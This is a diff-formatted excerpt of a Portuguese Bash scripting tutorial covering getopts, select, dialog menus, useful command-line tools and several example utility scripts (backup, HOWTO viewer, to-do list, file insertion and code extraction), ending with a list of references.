+	[ "$NINICIAL" != "$NFINAL" ] && mv -- "$FILE" "$DIR/$NFINAL"
+done
+}
+
+
+
+# visualiza um arquivo retirando linhas que comecem com um caractere
+# de comentário (#) e linhas vazias (linhas com espaços não são
+# vazias)
+function Mnocomments {
+[ "$1" ] || {
+	Mecho "Erro: falta argumentos"
+	echo "Uso: Mnocomments arquivo1 [arquivoN ...]"
+	return
+}
+
+# estou usando o more só por causa daqueles ":::::::" que aparecem
+# quando é passado mais de um arquivo como parâmetro. ;-)
+more $@ | egrep -v "^#|^$"
+
+}
+
+
+
+# faz cálculos usando o bc
+# só pra não precisar ficar fazendo "echo <expressao> | bc" toda hora
+function Mcalcula {
+[ "$1" ] || {
+	Mecho "Erro: você precisa passar uma expressão"
+	echo "Uso: Mcalcula <expressão>"
+	echo "Exemplo: Mcalcula '4^2+3*(7-4)'"
+	return 1
+}
+
+# mude o valor de "scale" se quiser mais de duas casas decimais
+echo "scale=2; $@" | bc
+
+}
+
+
+
+# mostra todas as cores do console e seus respectivos códigos.
+# mais uma cortesia do aurélio
+function Mcores {
+for LETRA in `seq 0 7`; do
+  for BOLD in '' ';1'; do
+    for FUNDO in `seq 0 7`; do
+      SEQ="4$FUNDO;3$LETRA"
+      echo -ne "\e[$SEQ${BOLD}m $SEQ${BOLD:-  } \e[m"
+    done
+    echo
+  done
+done
+}
+
+<-->
+/* ----------------- */
+
+   Se você quer ver umas funções porretas que o aurélio fez olhe em
+<http://verde666.org/zz>. Vou logo avisando que o ele parece ser daqueles
+tipos que não ligam para a "limpeza" do código, mas tudo bem... a gente
+faz uma forcinha pra enteder e no final das contas: o que importa é que
+funciona! ;-)
+
+
+
+-------------------------------------------------------------------------
+
+
+
+7. Tornando seu script amigável
+   ****************************
+
+   Alguns comandos úteis que tornam seu script mais "user-friendly".
+
+
+7.1. getopts
+     =======
+
+   Este comando serve para permitir que você use parâmetros na linha de
+comando de maneira mais eficiente que ficar usando as variáveis de posição
+de parâmetros ("$1", "$2"...). 
+   Sua sintaxe é:
+
+getopts 'CadeiaDeOpcoes' variavel
+
+Onde "CadeiaDeOpcoes" consiste em cada caractere que o getopts
+considerará, e "variavel" receberá este caractere. Para passar um
+parâmetro para o script você usa '-c' onde 'c' é o parâmetro. Veja este
+exemplo hipotético:
+
+getopts 'ab:c' variavel
+
+   Você poderá usar os parâmetros 'a', 'b' ou 'c'. Note que 'b' é seguido
+de um ':', isso significa que 'b' é um parâmetro que precisa de
+argumento. Este, por sua vez, é armazenado na variável OPTARG.
+
+   Mais detalhadamente, o getopts funciona assim (adaptado do "Teach
+Yourself Shell Programming in 24 Hours", veja Referências):
+
+    1. O getopts examina todos os argumentos da linha de comando
+       procurando por argumentos que comecem com o caractere '-'.
+
+    2. Quando acha um argumento começado com '-' o getopts procura
+       em "CadeiaDeOpcoes" se tem algum caractere que combine.
+
+    3. Se combinar com algum, "variavel" receberá este caractere,
+       caso contrário "variavel" receberá '?'.
+
+    4. Os passos 1-3 são repetidos até que todos os argumentos da
+       linha de comando tenham sido lidos.
+
+    5. Quando acaba de ler todos os argumentos da linha de comando
+       getops retorna um valor falso (não-zero). Isto é útil para
+       verificações em loops (como veremos no exemplo abaixo).
+
+
+   Hmmm... Confuso? Numa primeira olhada é confuso mesmo, é muita
+informação de uma vez só. Portanto dê uma olhada no exemplo a seguir,
+execute-o e depois releia este tópico. Não se esqueça de fazer o mais
+importante: praticar!
+
+
+/* ----------------- */
+<++> BashScript/getopts.sh
+#!/bin/bash
+
+USAGE="Uso: `basename $0` [-h] [-n nome] [-e email]"
+
+[ $1 ] || { echo $USAGE ; exit 1 ; }
+
+# observe que 'n' e 'e' precisam de argumentos
+while getopts 'hn:e:' PARAMETRO; do
+
+# atente para a utilidade do "case"! ;-)
+    case $PARAMETRO in
+
+	h) echo -n "
+Script de exemplo de uso do \"getopts\".
+
+Uso: `basename $0` [opções]
+
+Onde as opções podem ser:
+
+-n nome         imprime nome
+-e email        imprime email
+-h              exibe esta mensagem" ;;
+
+	n) NOME=$OPTARG ;;
+
+	e) EMAIL=$OPTARG ;;
+
+	*) echo -n "Entre \"`basename $0` -h\" para ajuda." ;;
+    esac
+done
+
+[ $NOME ] && echo $NOME
+[ $EMAIL ] && echo $EMAIL
+<-->
+/* ----------------- */
+
+   Execute este código e tire suas próprias conclusões.
+
+   Você pode ver mais um script que usa getopts no tópico "Exemplos
+Variados".
+
+
+
+7.2. select
+     ======
+
+   Este comando serve para fazer menus, onde o usuário pode escolher uma
+dentre várias opções. 
+   Sua sintaxe é um pouco parecida com a do "for":
+
+select opcao in lista-de-opcoes
+
+   A diferença é que o for faz um loop para cada palavra que estiver na
+"lista-de-opcoes" enquanto o select espera que o usuário escolha uma
+opção dentre as que estão na lista.
+
+   Veja este exemplo:
+
+/* ----------------- */
+<++> BashScript/conta.sh
+#!/bin/bash
+
+function Mecho {
+        echo -e "\e[1m$*\e[m"
+}
+
+# ATENÇÃO AQUI: o prompt que o select mostra é controlado pela
+#               variável PS3. E todas aqueles comentários sobre
+#               o PS1 feitas no tópico 2.2. valem aqui também.
+PS3="Opção: "
+
+echo -n "Entre com o primeiro número: "
+read NUM1
+echo -n "Entre com o segundo número: "
+read NUM2
+
+OPCOES="adicao subtracao multiplicacao divisao sair"
+
+select opc in $OPCOES; do
+    if [ "$opc" = adicao ]; then
+	Mecho "$NUM1 + $NUM2 = $[ $NUM1 + $NUM2 ]"
+    elif [ "$opc" = subtracao ]; then
+	Mecho "$NUM1 - $NUM2 = $[ $NUM1 - $NUM2 ]"
+    elif [ "$opc" = multiplicacao ]; then
+	Mecho "$NUM1 * $NUM2 = $[ $NUM1 * $NUM2 ]"
+    elif [ "$opc" = divisao ]; then
+	Mecho "$NUM1 / $NUM2 = `echo "scale=2;$NUM1/$NUM2" | bc -l`"
+    elif [ "$opc" = sair ]; then
+	Mecho "Tchau! "
+	exit
+    else
+	Mecho "Opção inválida! "
+    fi
+done
+
+<-->
+/* ----------------- */
+
+   Bem prático, não acha? ;-)
+
+
+
+7.3. dialog
+     ======
+
+   AVISO: o dialog não um comando específico do bash! Estou escrevendo
+sobre ele porque já vi muita gente querendo informações sobre ele e
+porque eu particularmente acho ele uma fofura. :-)
+
+   O dialog serve para fazer caixas de diálogo, e a sintaxe básica é
+assim:
+
+   dialog [ opcoes de título ] opções da caixa
+
+   As opções de título são opcionais (por isso que elas estão entre
+colchetes. duh!), as de caixa são obrigatórias. Para que você possa fazer
+agora uma apreciação visual do dialog tente o seguinte comando:
+
+dialog --yesno "Caixa onde se se escolhe Yes ou No" 0 0
+
+   Existem vários tipos de caixas, a utilizada nesse comando é uma caixa
+do tipo "yesno". Bem... isso foi só pra você dar uma admirada rápida no
+dialog. Agora vamos organizar as coisas, vou explicar alguns parâmetros.
+Vá praticando cada um desses parâmetros e vendo o resultado. Lembre-se que
+as opções da caixa são obrigatórias!
+
+
+* --backtitle "texto"
+
+   Este parâmetro é para por um título "lá atrás". Tente 
+dialog --backtitle "Micro\$oft Scandisk" --yesno bla 0 0
+e veja como o título que aparece lhe trará péssimas lembranças. =)
+
+   
+* --title "texto"
+
+   Este vai ser o título da caixa de diálogo.
+
+
+   Agora vamos as opções de caixa, mas antes uma informação:
+Em todos os tipos de caixas existem os argumentos "altura" e "largura"
+(que para abreviar, eu chamarei de "alt" e "larg"), que (por incrível
+que pareça) servem para você determinar a altura e largura da caixa de
+diálogo. Se você não tiver saco pra ficar contando quantos caracteres
+serão usados na caixa, use 0 para altura e largura, assim a caixa terá um
+tamanho de acordo com texto utilizado.
+
+
+* --yesno "texto" alt larg
+
+   Faz uma caixa de diálogo com as opções "Yes" e "No". Se você escolher
+"Yes" o dialog retorna 0, caso contrário, retorna 1.
+
+
+* --msgbox "texto" alt larg
+
+   Serve para mostrar uma mensagem e tem um botão de confirmação "OK".
+Quando você escolher "OK" o dialog retornará 0, e, assim como em todos os
+outros tipos de caixas, você pode cancelar via tecla ESC, quando o dialog
+retornará 255.
+
+
+* --inputbox "texto" alt larg [string de inicio]
+
+   Faz uma caixa de entrada de dados, se "string de inicio" for passada o
+campo de entrada de dados será inicializado por esta string. Os botões
+são "OK" E "Cancel", o primeiro, se selecionado, retorna 0 e o outro
+retorna 1. A string que você entrar será direcionada para a saída de erro
+padrão, portanto, se você quer que isto seja gravado use redirecionamento
+de stderr (ver 3.3 Redirecionamento).
+
+
+* --textbox arquivo alt larg
+
+   É como se fosse um simples visualizador de arquivos texto. Use as
+setinhas do teclado para se movimentar. Para pesquisar pra frente use '/'
+e para pesquisar pra trás use '?'.
+
+
+* --menu "texto" alt larg alt-do-menu item1 "descricao do item1" \
+                                    [ itemN "descricao do itemN" ]
+
+   Note que aquela '\' lá no final da linha significa que o comando
+continua na próxima linha. Como o próprio nome diz, esse parâmetro é
+usado para fazer menus, como por exemplo aquele do pppsetup (slackware)
+onde você escolhe qual o ttyS do seu modem. O item que for escolhido será
+impresso em stderr. "OK" retorna 0 e "Cancel" retorna 1.
+   Veja um exemplo besta só pra ilustrar:
+
+/* ----------------- */
+<++> BashScript/menudialogtest.sh
+#!/bin/bash
+
+FILE=/tmp/script-$$
+
+dialog --title "Teste fuleiro da caixa de diálogo \"menu\"" \
+  --menu "Qual comando você deseja executar?" 0 0 0 \
+  "pwd" "mostra o diretório atual" \
+  "ps aux" "lista os processos que estão sendo executados" \
+  "uname -a" "exibe informações sobre o SO e a máquina local" \
+  "users" "lista os usuários que estão logados no momento" 2> $FILE
+
+# Lembre-se que o item escolhido será impresso em stderr. E repare
+# acima que eu estou redirecionando stderr para um arquivo.
+
+RET_VAL=$?
+[ $RET_VAL -eq 0 ] || { echo "Operação cancelada."; exit 1; }
+
+sh $FILE
+
+rm $FILE
+<-->
+/* ----------------- */
+
+
+* --checklist "texto" alt larg alt-da-lista \
+   item1 "descricao do item1" status [ item2 "descricao do item2" status ]
+
+   Note novamente o caractere '\' fazendo o comando continuar na linha
+abaixo. Este tipo de caixa é utilizado quando se quer fazer um menu onde
+pode-se escolher vários itens, você marca os que deseja e dá "OK". Assim
+como o "--menu", o(s) item(ns) que for(em) escolhido(s) serão impressos em
+stderr. O parâmetro "status" serve para você deixar um determinado item
+selecionado logo de início, seus valores podem ser "on" ou "off".
+   Veja este exemplo bem interessante (oh! finalmente um exemplo com
+alguma utilidade!) que usa muitos dos conceitos já ensinados até aqui, se
+não entender releia o código:
+
+/* ----------------- */
+<++> BashScript/bacanas/mp3select.sh
+#!/bin/bash
+#
+#   "Escolhedor" de mp3z feito para ilustrar o uso do 'dialog'
+# no texto "Programação em Bourne-Again Shell".
+#
+#   Para utilizar este script é necessário ter instalado o mpg123.
+#
+# + OBS.: Se o nome de alguma mp3 for muito grande podem acontecer
+# resultados bizarros... :-/
+# + OBS.II: Este script não "detecta" nome de mp3z que contenham
+# espaços. Pois se detectasse também ocorreriam resultados bizarros.
+#
+# Feito por: meleu <meleu@meleu.cjb.net>
+
+
+# mude a variável MP3DIR e descomente-a para não
+# precisar passar o diretório toda hora na linha
+# de comando.
+#MP3DIR="$HOME/mp3z/"
+FILE="/tmp/mp3.$$"
+NCOR="\e[m"
+WHITE="\e[1m"
+
+
+function AjudarSair {
+	echo "Tente \"`basename $0` -h\" para ajuda."
+	exit $1
+}
+
+
+function ApagarSair {
+	rm $FILE
+	exit $1
+}
+
+
+# óia o getopts aê gente! =)
+while getopts 'd:n:h' OPCAO; do
+    case $OPCAO in
+    d) MP3DIR="$OPTARG" ;;
+    n) NOME="*$OPTARG" ;;
+    h) echo -e "
+${WHITE}* Meleu's mp3 escolheitor (Tabajara, Inc.)$NCOR
+
+Uso: `basename $0` [-d diretorio] [-n nome] [-h]
+
+-d diretorio	diretório onde serão procuradas as mp3z
+-n nome		nome que será procurado no diretório
+-h		imprime esta mensagem
+"
+       exit ;;
+    *) exit 1 ;;
+    esac
+done
+
+
+if [ -z "$MP3DIR" ]; then
+  echo -e "${WHITE}Você precisa indicar em qual diretório estão as mp3z.$NCOR"
+  AjudarSair 1
+elif [ ! -d "$MP3DIR" ]; then
+  echo -e "$WHITE\"$MP3DIR\" não é um diretório.$NCOR"
+  AjudarSair 1
+fi
+
+cd "$MP3DIR"
+
+LISTA=`/bin/ls -1 $NOME*.mp3 2>/dev/null | grep -v ' '`
+[ -z "$LISTA" ] && {
+	echo -e "${WHITE}Nenhuma mp3 foi encontrada em \"$MP3DIR\".$NCOR"
+	AjudarSair 1
+}
+
+CONT=1
+
+dialog --backtitle "Selecionador de mp3z" \
+ --title "$MP3DIR" \
+ --checklist "Escolha a música" 0 0 0 \
+$(for ITEM in $LISTA ; do
+	echo "$ITEM" "$CONT" off
+	(( CONT++ ))
+done) 2>> $FILE
+
+RET_VAL=$?
+[ $RET_VAL -ne 0 ] && { echo "Tchau!"; ApagarSair; }
+
+
+# verificando se já existe um processo com o mpg123
+MPGPID=`ps ax --format pid,comm | grep mpg123 | cut -c-6`
+[ $MPGPID ] && {
+	dialog --backtitle "Selecionador de mp3z" \
+	--title "O mpg123 JÁ ESTÁ SENDO USADO!" \
+	--yesno "Deseja finalizá-lo para ouvir a sua lista?" 0 0
+	RET_VAL=$?
+	if [ $RET_VAL -eq 0 ]; then
+	    kill $MPGPID 2>/dev/null || {
+		echo -e "${WHITE}Não foi possível finalizar o mpg123.$NCOR"
+		echo "Pode ser que outro usuário esteja utilizando-o."
+		ApagarSair 1
+	    }
+	else
+	    echo "Saindo..."
+	    ApagarSair
+	fi
+}
+
+# o sleep é pra garantir que o /dev/dsp estará desocupado
+sleep 1s
+
+cat $FILE | xargs mpg123 2> /dev/null &
+
+ApagarSair
+
+# EoF #
+<-->
+/* ----------------- */
+
+
+* --radiolist "texto" alt larg alt-da-lista \
+    item1 "descricao do item1" status [ item2 "descricao do item2 status ]
+
+   Similar ao --checklist porém aqui só se pode fazer uma escolha, quando
+você seleciona um item desmarca outro. Faça os testes por sua conta.
+
+
+
+   Chega de moleza! Se quiser saber mais leia a man page do dialog! ;)
+
+
+
+-------------------------------------------------------------------------
+
+
+
+8. Coisas úteis de se aprender
+   ***************************
+
+   Não basta saber somente sobre o bash! Existem muitas outras coisas
+fora do bash que você deve usar pra aumentar o poder dos seus scripts.
+O meu público-alvo são os fuçadores e como tais eles não podem ter
+preguiça de ler as manpages. Vai lá cara... a manpage é uma grande amiga!
+;-)
+   Aqui vai uma lista do que seria bom de você aprender, o que está
+marcado com um asterisco quer dizer que é muito útil de aprender:
+
++ Linguagens:
+	awk; *Expressões Regulares (ERs);
+
++ Comandos:
+	*grep; *sed; *cut; tr; paste; sort; uniq; bc; *expr; *wc; eval
+(na manpage do bash); trap (idem); comm; join; netcat e lynx (ambos são
+muito úteis se você quer fazer scripts que usem o que a rede tem a nos
+oferecer. o netcat, vulgo nc, pode ser encontrado em
+<http://www.atstake.com/research/tools>).
+
+   Cara... sabendo tudo isso, você já será um iniciado. A partir daí o
+que manda é a experiência, prática, prática e prática. Muita prática! Um
+dia eu ainda chego a esse nível...
+
+   Eu sei que está na lista ali em cima, mas vale salientar: ERs, grep e
+sed são REALMENTE MÚITO ÚTEIS!!!
+
+
+
+-------------------------------------------------------------------------
+
+
+
+9. Exemplos Variados
+   *****************
+
+   É verdade que são poucos exemplos. Eu poderia ficar "enxendo
+lingüiça" metendo vários exemplos aqui e dizer que escrevi quatro mil
+linhas de texto, mas acho que não seria uma boa... Se você quer mais
+exemplos olhe as Referências (principalemente no Adv-Bash-Scr-HOWTO),
+entre na lista de discussão... enfim: se vire!
+
+
+
+9.1. backup.sh
+     =========
+
+/* ----------------- */
+<++> BashScript/bacanas/backup.sh
+#!/bin/bash
+# OBS.: Por favor melhore este script! :-)
+
+# Se o número de parâmetros for menor que 2...
+[ $# -lt 2 ] && {
+  echo "Uso: `basename $0` destino origem [origem2 origem3...]"
+  exit 1        # ... sai do script
+}
+
+echo "--> Fazendo backup"
+FILE="${1}_$(/bin/date +%d-%m-%Y).tgz"
+shift
+# Aqui está o "segredo": o shift acima é executado para que eu possa
+# usar "$*" no if abaixo.
+
+if tar czf $FILE $* ; then
+  echo "--> Backup feito com sucesso"
+else
+  echo "--> OCORREU UM ERRO <--" 1>&2
+  exit 1
+fi
+<-->
+/* ----------------- */
+
+
+
+9.2. howto.sh
+     ========
+
+/* ----------------- */
+<++> BashScript/bacanas/howto.sh
+#!/bin/bash
+#
+# *********************************************
+# * Script para visualizar HOWTOs rapidamente *
+# *********************************************
+#               http://meleu.da.ru
+#          meleu <meleu@meleu.cjb.net>
+#
+#    Inspirado em um outro script que vi no Tips-HOWTO.
+#    O script do Tips-HOWTO era muito simples, fiz algumas
+# modificações que são interessantes para nós que falamos
+# português e de vez em quando temos uns HOWTOs traduzidos,
+# e ainda fiz um "suporte" aos mini-HOWTOs. ;-)
+#    E mais: se você não lembra direito do nome do HOWTO, pode
+# passar apenas a(s) primeira(s) letra(s) e/ou usar os curingas
+# ('*', '?' e '[]'), mas aconselha-se, neste último caso, o uso de
+# aspas ("quoting") para evitar que seja passado como parâmetro(s)
+# o conteúdo do diretório atual. Caso ele encontre mais de um
+# arquivo para a expressão você poderá escolher através da tela que
+# aparecerá.
+# Exemplos:
+# [prompt]$ howto Net
+# [prompt]$ howto "*[Bb]ash"
+# [prompt]$ howto "*Prog"
+#
+#    Se você ainda não tem e não sabe onde pegar HOWTOs traduzidos
+# procure em http://ldp-br.conectiva.com.br
+#
+# Pré-requisitos para o script funcionar direitinho (ou seja, sem
+# precisar de alterações):
+#    + os HOWTOs devem estar em "/usr/doc/Linux-HOWTOs";
+#    + os HOWTOs em português devem estar em "/usr/doc/Linux-HOWTOs.pt";
+#    + os mini-HOWTOs devem estar em "/usr/doc/Linux-mini-HOWTOs";
+#    + todos os [mini-]HOWTOs[.pt] devem estar gzipados, se os seus não
+#      estão assim basta entrar no diretório dos HOWTOs e digitar
+#      "gzip *".
+#
+#
+#    Se você testou o script, ele funcionou direitinho e você gostou,
+# então digite "cp howto.sh /usr/local/bin/howto" para que todos do
+# seu sistema possam utilizá-lo. ;-)
+#
+# Aproveite!
+
+
+# Estes são os diretórios onde são instalados os [mini-]HOWTOs no
+# Slackware. Se a sua distribuição usa um diretório diferente
+# mude a(s) variável(is) a seguir.
+HTDIR=/usr/doc/Linux-HOWTOs
+miniHTDIR=/usr/doc/Linux-mini-HOWTOs
+PTHTDIR=/usr/doc/Linux-HOWTOs.pt     # este é onde eu coloco os traduzidos
+
+
+# Variáveis que indicam as cores (pra não precisar ficar
+# digitando os códigos ANSI toda hora)
+BLUE="\e[1;34m"
+RED="\e[1;31m"
+NCOLOR="\e[m"
+
+
+function Ler {
+zless $1
+echo -e "${RED}\nTchau!\n$NCOLOR"
+exit
+}
+
+# Função que mostra a lista dos HOWTOs e sai do script.
+function Lista {
+        ls -C $HTDIR | less
+        echo -e "
+${BLUE}Uso:$NCOLOR `basename $0` [-p | -m] nome-do-HOWTO
+Faça '`basename $0` -h' para ver a descrição das opções."
+	exit 1
+}
+
+
+# se não for passado nenhum parâmetro ele mostra a lista
+[ -z "$1" ] && Lista
+
+
+# --------------------
+# - TESTA PARÂMETROS -
+# --------------------
+case $1 in
+
+#  - mensagem de ajuda -
+#  ---------------------
+-h) echo -e "
+${RED}--[ Lista de opções ]--$NCOLOR
+-p \t HOWTOs em português
+-m \t mini-HOWTOs
+-h \t imprime esta mensagem
+"
+    exit	# depois da mensagem de ajuda, sair
+;;
+
+# - HOWTOs em português -
+# -----------------------
+-p) HTDIR=$PTHTDIR
+    [ -z "$2" ] && Lista
+    shift	# Lembra do 'shift'? Aqui ele faz com que o primeiro
+		# parâmetro deixe de ser '-p' para ser o nome-do-HOWTO
+;;
+
+# - mini-HOWTOs -
+# ---------------
+-m) HTDIR=$miniHTDIR
+    [ -z "$2" ] && Lista
+    shift	# mesma função do shift no '-p'
+;;
+
+esac	# Ao fim deste case $1 tem necessariamente o nome ou a(s)
+	# primeira(s) letra(s) do nome do HOWTO a ser procurado.
+
+cd $HTDIR
+
+FILE=`ls $1*.gz 2>/dev/null`
+
+[ `echo $FILE | wc -w` -gt 1 ] && {
+   PS3="Entre com o número: "
+   select opc in $FILE Sair ; do
+
+	[ "$opc" = "Sair" ] && exit
+
+	for HOWTO in $FILE ; do
+	    [ "$opc" = "$HOWTO" ] && Ler $HOWTO
+	done
+    done
+}
+
+[ -e "$FILE" ] && Ler $FILE
+
+
+# Isto só será executado se não for encontrado o HOWTO
+echo -e "${RED}* * * HOWTO não encontrado * * *$NCOLOR"
+echo "Tente '`basename $0` [-p | -m]' para ver a lista"
+exit 1
+
+# - = < E O F > = -
+<-->
+/* ----------------- */
+
+
+
+9.3. todo.sh
+     =======
+
+/* ----------------- */
+<++> BashScript/bacanas/todo.sh
+#!/bin/bash
+
+PROG=`basename $0`
+EDITOR=`which vi`
+FILE="$HOME/.ToDo"
+USAGE="Uso: $PROG [-h|-e]"
+
+case $1 in
+        -h) echo "
+$USAGE
+
+-e	edita a lista de \"Para Fazer\" (To Do)
+-h	imprime esta mensagem e sai
+
+Sem parâmetros $PROG irá mostrar a lista de \"To-Do\".
+"
+	    exit ;;
+
+	-e) $EDITOR $FILE
+	    exit ;;
+
+	'') cat $FILE 2> /dev/null || {
+		echo "Você precisa criar o arquivo $HOME/.ToDo !"
+		echo "Entre \"$PROG -e\" para editar seu ~/.ToDo"
+		echo "Para ajuda tente \"$PROG -h\""
+		exit 1
+	    } ;;
+
+	*) echo "Parâmetro \"$1\" desconhecido!"
+	   echo "$USAGE"
+	   echo "Entre com \"$PROG -h\" para ajuda."
+	   exit ;;
+
+esac
+<-->
+/* ----------------- */
+
+
+
+9.4. inseretxt.sh
+     =========
+
+/* ----------------- */
+<++> BashScript/bacanas/inseretxt.sh
+#!/bin/bash
+#
+# Muitas vezes durante a escrita do texto
+# "Programação em Bourne-Again Shell" eu precisava
+# inserir um código de um script numa determinada
+# posição do arquivo e esta posição ficava entre
+# muito texto antes e depois dessa linha.
+# Para fazer isso de uma maneira mais cômoda, eu
+# escrevi este script.
+#
+# Para informações sobre o uso tente o parâmetro '-h' ou
+# '--help'.
+# Se você passar como o parâmetro "linha" um número maior
+# que o de linhas total do "ArqOriginal" os "arquivosN"
+# serão inseridos no final do "ArqOriginal".
+#
+# Ah! Lembre-se de uma coisa: "linha" precisa ser um
+# inteiro positivo. E lembre-se de mais uma coisa: 0
+# não é um número positivo. ;-)
+#
+# meleu.
+#
+
+
+B="\e[1m"
+N="\e[m"
+USO="Uso: `basename $0` linha ArqOriginal arquivo1 [arquivoN ...]"
+AJUDA="Tente \"`basename $0` --help\" para ajuda"
+
+[ "$1" = '-h' -o "$1" = '--help' ] && {
+    echo -e "
+${B}Insere o conteúdo de arquivo(s) dentro de um outro.$N
+
+$USO
+
+Onde:
+\"linha\"       é a linha onde o texto será inserido
+\"ArqOriginal\" é o arquivo que receberá os textos 
+\"arquivoN\"    são os arquivos que serão inseridos em ArqOriginal
+"
+    exit
+}
+
+[ $# -lt 3 ] && {
+    echo -e ${B}Erro: erro na passagem de parâmetros$N
+    echo $USO
+    echo $AJUDA
+    exit -1
+}
+
+Linha=$1
+# verificando se $Linha é um número inteiro positivo
+[ `expr $Linha - 1 2>/dev/null` -ge 0 ] 2>/dev/null || {
+    echo -e ${B}Erro: O primeiro parâmetro precisa ser inteiro positivo$N
+    echo $AJUDA
+    exit 1
+}
+
+ArqOriginal=$2
+[ -f $ArqOriginal ] || {
+    echo -e ${B}Erro: \"$ArqOriginal\" não existe ou não é um arquivo regular$N
+    echo $AJUDA
+    exit 2
+}
+
+
+function ApagarSair {
+    rm "$1"
+    exit $2
+}
+
+
+shift 2
+Temp=/tmp/`basename $ArqOriginal`-$$.tmp
+
+# --> início do arquivo original:
+head -$[$Linha-1] $ArqOriginal > $Temp
+
+# --> arquivos que serão inseridos:
+ContaAcerto=0
+for Arq in "$@"; do
+    [ -f "$Arq" ] || {
+	echo -e ${B}OBS.: \"$Arq\" não existe ou não é um arquivo regular$N
+	continue
+    }
+    cat $Arq >> $Temp
+    (( ContaAcerto++ ))
+done
+[ $ContaAcerto -eq 0 ] && {
+    echo -e ${B}Nenhum arquivo foi inserido em \"$ArqOriginal\"$N
+    ApagarSair $Temp 3
+}
+echo
+
+# --> pra terminar, final do arquivo original:
+sed -n "$Linha,\$p" $ArqOriginal >> $Temp
+
+
+ArqFinal="$ArqOriginal.new"
+[ -e $ArqFinal ] && {
+    echo -e ${B}Já existe um arquivo chamado \"$ArqFinal\".$N
+    read -n 1 -p "Deseja sobregravá-lo? (s/N) " SN
+    echo
+    [ "$SN" != 'S' -a "$SN" != 's' ] && {
+	echo -e "$B\nOperação cancelada!$N"
+	ApagarSair $Temp 3
+    }
+}
+
+cat $Temp > $ArqFinal
+
+echo -e "
+${B}Operação concluída com sucesso.$N
+Confira em \"$ArqFinal\"
+"
+
+ApagarSair $Temp
+
+<-->
+/* ----------------- */
+
+
+
+9.5. Mextract.sh
+     ===========
+
+/* ----------------- */
+<++> BashScript/bacanas/Mextract.sh
+#!/bin/sh
+#
+# ****************************
+# * Meleu Extraction Utility *
+# ****************************
+#      http://meleu.da.ru
+#
+#   Este script é baseado no Phrack Extraction Utility, (mais informações
+# <http://www.phrack.org>). Fiz ele, primeiro para praticar, segundo para
+# servir como mais um exemplo no texto "Programação em Bourne-Again Shell", 
+# e último para extração dos códigos do texto. =P
+#
+############# Se já existirem arquivos com o nome dos que serão extraídos
+# !CUIDADO! # eles serão sobregravados! Portanto, se você extrair uma vez,
+############# alterar o(s) código(s) extraído(s) e extrair novamente,
+#             perderá as alterações feitas!
+#
+#
+#   A seguir eu vou comentar sobre o código fazendo referência aos tópicos
+# do texto "Programação em Bourne-Again Shell".
+#
+#
+#    + A função do IFS é explicada no tópico "2.2. Variáveis do Shell",
+# neste script eu usei o IFS com valor nulo (vazio) para que os comandos
+# considerem espaços que vêm antes de qualquer caractere como parte do
+# dado. Se você fizer por exemplo "read var" e antes de entrar qualquer
+# coisa colocar espaços e/ou TAB, você verá que eles serão desconsiderados
+# se o IFS tiver seu valor default (espaço, TAB, newline);
+#
+#    + A opção -r no read (explicada em 3.2. read) serve para ignorar o
+# poder que a contra-barra (backslash) tem de "escapar" os caracteres. Em
+# outras palavras: a opção -r garante que quando o read receber uma
+# contra-barra ela será passada para a variável sem nenhum valor especial;
+#
+#    + O cat enviando os dados para o read do while é explicado em
+# "5.5. Redirecionando loops" sob o título de "pipeando para o while";
+#
+#    + o set é usado para fazer com que cada palavra (palavra aqui tem um
+# sentido de conjunto de caracteres separados por aqueles definidos no
+# IFS) vire um parâmetro posicional, conforme explicado em
+# "2.4.2. set (para editar parâmetros posicionais)". A opção -- quer dizer
+# "acabaram as opções, o que vier a partir daqui são os valores dos
+# parâmetros de posição", esta opção serve para prevenir que alguma
+# informação que comece com o caractere - seja considerado uma opção
+# sendo passada para o set;
+#
+#    + No tópico "2.5. Substituição de Variáveis" você verá a explicação
+# de se usar "FILE=${FILE:-.}/$1";
+#
+#    + Bom... acho que é isso. Leia o código, execute-o, faça testes,
+# mude o código, execute-o novamente, veja o que mudou nos resultados,
+# leia as manpages em caso de dúvidas... Enfim, use o método hacker de
+# aprender a programar! ;-)
+#
+#
+# Espero que curta!
+# meleu <meleu@meleu.cjb.net>
+#
+# P.S.: Quer um "dever de casa"? Altere o código para que ele verifique
+#	se já existe arquivos com o mesmo nome dos que estão prestes a
+#	serem extraídos. Se existir, alertar o usuário sobre isso. Tente
+#	também fazer meios de detecção dos possíveis erros que possam
+#	ocorrer...
+#	Ah, sei lá! Brinque com o código um pouco! =)
+#
+
+B="\e[1m"
+N="\e[m"
+
+[ $# -lt 1 ] && {
+    echo -e "${B}Erro: falta parâmetros$N"
+    echo "Uso: `basename $0` arquivo1 [arquivoN]"
+    exit 1
+}
+
+[ -w . ] || {
+    echo -e "${B}Erro: você não tem permissão de escrita neste diretório$N"
+    exit 1
+}
+
+
+OldIFS="$IFS"
+IFS=
+cat $@ |
+while read -r LINHA ; do
+	IFS="$OldIFS"
+
+	set -- $LINHA
+	case "$1" in
+	'<++>')
+		TempIFS="$IFS"
+		IFS=/
+		set -- $2
+		IFS="$TempIFS"
+		while [ $# -gt 1 ]; do
+		    FILE=${FILE:-.}/$1
+		    [ -d $FILE ] || mkdir $FILE
+		    shift
+		done
+		FILE="${FILE:-.}/$1"
+		if echo -n 2>/dev/null > $FILE ; then
+		    echo "* Extraindo $FILE"
+		else
+		    echo -e "$B--> houve um erro ao tentar extrair '$FILE'"
+		    echo -e "    este arquivo será ignorado.$N"
+		    unset FILE
+		fi
+		
+	;;
+
+	'<-->')
+		unset FILE
+	;;
+
+	*)
+		[ "$FILE" ] && {
+		    IFS=
+		    echo "$LINHA" >> $FILE
+		}
+	;;
+
+	esac
+
+done
+
+echo "--> Fim <--"
+<-->
+/* ----------------- */
+
+
+
+-------------------------------------------------------------------------
+
+
+
+10. Referências
+    ***********
+
+Guia focalinux --> Na endereço a seguir você encontrará ótimos guias
+                   sobre o GNU/Linux, divididos em níveis (iniciante,
+                   intermediário e avançado). Muito bom pra quem está
+                   começando neste sistema.
+                   http://www.focalinux.org
+
+Bash-Prog-Intro-HOWTO ---> Bem prático e objetivo, bom pra começar (foi
+                           com ele que eu comecei).
+Bash-Prompt-HOWTO ---> Texto bacana que ensina a fazer coisinhas bonitas
+                       com o prompt, ensina também a usar cores no
+                       console através de códigos de escape ANSI.
+Adv-Bash-Scr-HOWTO ---> Este já é mais avançado. Se você quer realmente
+                        se aprofundar no assunto este é o texto que deve
+                        ler! Muitos códigos para se ler e aprender!
+                        Todos estes três HOWTOs podem ser encontrados em
+                        http://www.linuxdoc.org ou se preferir
+                        /usr/doc/Linux-HOWTOs
+
